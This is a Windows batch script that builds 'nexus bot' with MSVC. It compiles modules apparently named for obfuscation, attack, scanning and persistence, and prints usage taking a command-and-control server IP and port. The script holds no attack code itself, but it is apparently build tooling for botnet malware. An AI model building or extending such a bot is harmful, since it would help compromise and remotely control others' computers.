@echo off
REM ============================================================
REM  nexus bot — Windows build script
REM  Requires: Visual Studio 2022 (or Build Tools) with C++ workload
REM
REM  Usage:
REM    build.bat              — release build (x64)
REM    build.bat debug        — debug build with console output
REM    build.bat x86          — 32-bit release build
REM ============================================================

setlocal enabledelayedexpansion

set "SRC=src\main.cpp src\obfuscate.cpp src\attack.cpp src\socket.cpp src\scanner.cpp src\persistence.cpp"
set "OUT=nexus-bot.exe"
set "LIBS=ws2_32.lib advapi32.lib"
set "FLAGS=/EHsc /std:c++17 /W3 /nologo"
set "DEFINES="

REM --- Check for Visual Studio environment ---
where cl.exe >nul 2>&1
if %errorlevel% neq 0 (
    echo [!] MSVC compiler (cl.exe) not found in PATH.
    echo     Run from a "Developer Command Prompt for VS 2022"
    echo     or run: "C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvars64.bat"
    exit /b 1
)

REM --- Parse arguments ---
set "BUILD_TYPE=release"
set "ARCH=x64"

:parse_args
if "%1"=="" goto :build
if /i "%1"=="debug" (
    set "BUILD_TYPE=debug"
    shift
    goto :parse_args
)
if /i "%1"=="x86" (
    set "ARCH=x86"
    shift
    goto :parse_args
)
if /i "%1"=="x64" (
    set "ARCH=x64"
    shift
    goto :parse_args
)
echo unknown option: %1
exit /b 1

:build
echo [*] nexus bot build — %BUILD_TYPE% %ARCH%

REM --- Set compiler flags by type ---
if /i "%BUILD_TYPE%"=="release" (
    set "FLAGS=%FLAGS% /O2 /MT"
    set "DEFINES=NDEBUG"
) else (
    set "FLAGS=%FLAGS% /Od /Zi /MTd"
    set "DEFINES=_DEBUG DEBUG"
)

REM --- Architecture flags ---
if /i "%ARCH%"=="x86" (
    set "FLAGS=%FLAGS%"
    set "OUT=nexus-bot-x86.exe"
) else (
    set "FLAGS=%FLAGS%"
)

REM --- Compile ---
for %%d in (%DEFINES%) do (
    set "FLAGS=!FLAGS! /D%%d"
)

echo [*] compiling...
cl %FLAGS% /Fe:%OUT% %SRC% %LIBS%

if %errorlevel% equ 0 (
    echo [+] build successful: %OUT%
    echo.
    echo [*] Run with: %OUT% [cnc_ip] [cnc_port]
    echo [*] Default CNC: 127.0.0.1:19443
) else (
    echo [!] build FAILED
    exit /b %errorlevel%
)

endlocal
